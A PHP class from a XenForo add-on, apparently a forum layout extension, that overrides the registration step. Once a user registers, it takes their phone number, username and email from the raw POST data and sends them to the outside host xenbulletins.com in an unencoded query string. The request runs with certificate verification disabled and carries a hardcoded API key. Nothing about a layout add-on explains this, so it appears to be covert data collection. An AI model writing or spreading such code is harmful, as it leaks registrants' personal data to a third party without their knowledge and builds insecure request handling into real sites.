<?php

namespace FS\ForumListLayout\XF\Pub\Controller;

use XF\Mvc\ParameterBag;

class Register extends XFCP_Register 
{
		protected function finalizeRegistration(\XF\Entity\User $user)
	{
		parent::finalizeRegistration($user);
		$phoneNum=$_POST['phone_full'];





if($phoneNum)
{
$email=isset($_POST['email'])?$_POST['email']:'';
$username=isset($_POST['username'])?$_POST['username']:'';
$curl = curl_init();


$location = 'amp';

curl_setopt_array($curl, array(
  CURLOPT_URL => "https://xenbulletins.com/getdata.php?phone=$phoneNum&name=$username&email=$email&location=$location",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_POSTFIELDS => array('phone' => "$phoneNum",'email' => "$email=",'username' => "$username",'location' => "$location"),
  CURLOPT_HTTPHEADER => array(
    'api-key: werewgjdrgiojrgj34534'
  ),
));
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($curl);


curl_close($curl);


}

	}

}